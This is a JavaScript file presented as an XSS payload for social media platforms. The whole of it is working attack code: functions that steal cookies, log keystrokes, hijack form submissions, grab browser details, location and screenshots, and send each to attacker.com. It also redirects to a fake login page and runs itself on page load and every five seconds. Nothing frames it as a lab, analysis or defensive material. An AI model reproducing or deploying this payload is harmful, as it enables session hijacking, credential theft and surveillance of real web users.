// JavaScript Injection Payload
// XSS Payload for Social Media Platforms

// Basic XSS payload - alerts a message
function basicXSS() {
    alert("XSS Vulnerability Detected!");
}

// Cookie stealer - sends cookies to attacker server
function stealCookies() {
    var cookies = document.cookie;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/steal?c=' + encodeURIComponent(cookies));
    xhr.send();
}

// Keylogger - logs all keystrokes
function installKeylogger() {
    document.onkeypress = function(e) {
        var key = e.key;
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://attacker.com/keylog?k=' + encodeURIComponent(key));
        xhr.send();
    };
}

// Redirect to phishing site
function redirectToPhish() {
    window.location.href = 'http://fake-login.com';
}

// Capture and send form data
function hookForms() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        forms[i].addEventListener('submit', function(e) {
            e.preventDefault();
            
            var formData = new FormData(this);
            var data = {};
            formData.forEach(function(value, key) {
                data[key] = value;
            });
            
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://attacker.com/steal');
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
            
            // Continue with normal form submission
            this.submit();
        });
    }
}

// Get current location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://attacker.com/location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
            xhr.send();
        });
    }
}

// Get browser information
function getBrowserInfo() {
    var info = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled,
        screenResolution: screen.width + 'x' + screen.height
    };
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/browser');
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(info));
}

// Take screenshot using canvas
function takeScreenshot() {
    if (typeof html2canvas === 'undefined') {
        // Load html2canvas library dynamically
        var script = document.createElement('script');
        script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
        script.onload = function() {
            html2canvas(document.body).then(function(canvas) {
                var dataURL = canvas.toDataURL('image/png');
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'http://attacker.com/screenshot');
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify({
                    data: dataURL,
                    width: canvas.width,
                    height: canvas.height
                }));
            });
        };
        document.head.appendChild(script);
    } else {
        html2canvas(document.body).then(function(canvas) {
            var dataURL = canvas.toDataURL('image/png');
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://attacker.com/screenshot');
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                data: dataURL,
                width: canvas.width,
                height: canvas.height
            }));
        });
    }
}

// Inject malicious content into the page
function injectContent() {
    var div = document.createElement('div');
    div.style.position = 'fixed';
    div.style.top = '20px';
    div.style.left = '20px';
    div.style.zIndex = '9999';
    div.style.backgroundColor = 'red';
    div.style.color = 'white';
    div.style.padding = '10px';
    div.style.borderRadius = '5px';
    div.style.fontWeight = 'bold';
    div.textContent = 'WARNING: This page is vulnerable!';
    
    document.body.appendChild(div);
}

// Main function to execute all payloads
function executeAll() {
    try {
        basicXSS();
        stealCookies();
        installKeylogger();
        hookForms();
        getBrowserInfo();
        injectContent();
        
        // Optional: Request location and screenshot (may require permissions)
        // getLocation();
        // takeScreenshot();
    } catch (e) {
        console.error('XSS Payload Execution Failed:', e);
    }
}

// Execute when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', executeAll);
} else {
    executeAll();
}

// Also execute periodically to catch dynamic content
setInterval(executeAll, 5000);
